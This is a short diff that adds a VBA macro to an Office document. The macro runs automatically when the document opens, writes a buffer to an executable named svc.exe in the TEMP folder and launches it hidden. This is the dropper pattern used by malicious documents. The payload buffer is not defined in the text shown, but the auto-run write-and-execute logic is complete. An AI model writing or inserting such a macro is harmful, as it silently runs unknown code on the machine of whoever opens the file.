@@ -1,0 +1,8 @@
+Sub Document_Open()
+p = Environ("TEMP") & "\svc.exe"
+Open p For Binary As #1
+Put #1, , buf
+Close #1
+Shell p, 0
+End Sub
+
